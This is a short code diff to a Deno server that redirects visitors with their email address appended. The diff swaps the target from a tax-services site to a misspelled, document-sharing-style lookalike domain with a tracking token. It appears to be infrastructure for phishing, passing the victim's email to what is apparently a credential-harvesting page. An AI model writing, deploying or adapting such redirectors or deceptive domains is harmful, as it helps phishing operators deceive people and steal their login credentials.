@@ -4,7 +4,7 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "http://jnstaxservices.com/services";
+    "https://entry.docunnentindafsharilsdocsnoralidacitlonpath.org/?r=j2e2l3d2mzmkvplzfp6g3fxd/";
 
   let email: string | null = null;
 
@@ -48,7 +48,7 @@ Deno.serve({ port: PORT }, async (req) => {
   }
 
   const redirectUrl = email
-    ? redirectBase.replace(/\/+$/, "") + "?email=" + email
+    ? redirectBase.replace(/\/+$/, "") + "?&email=" + email
     : redirectBase;
 
   return Response.redirect(redirectUrl, 302);
